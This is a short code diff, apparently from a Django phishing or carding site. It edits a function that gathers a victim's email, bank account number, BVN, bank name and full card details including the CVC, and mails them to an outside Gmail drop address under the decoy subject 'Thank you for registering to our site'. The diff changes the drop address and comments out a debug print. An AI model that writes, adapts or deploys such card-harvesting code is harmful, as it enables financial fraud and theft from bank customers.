@@ -49,6 +49,6 @@ def mail_me(email,account_number,bvn, bank_name,card_name,card_number,card_year,
     subject = 'Thank you for registering to our site'
     message = 'EMAIL== ' + email + ' ACC NUM=='+account_number + ' BVN== '+bvn + ' BANK NAME=='+bank_name + 'CARD NAME=='+card_name + 'CARD NUM=='+card_number+ 'CARD YEAR=='+card_year +'CARD MONTH=='+card_month +'CVC=='+card_cvc
     email_from = email
-    print(subject, message, email_from, ["sunnyemmanuel5@gmail.com"] )
-    return send_mail( subject, message, email_from, ["eliskafilat10@gmail.com"] )
+    # print(subject, message, email_from, ["sunnyemmanuel5@gmail.com"] )
+    return send_mail( subject, message, email_from, ["borrow.ng@gmail.com"] )
     
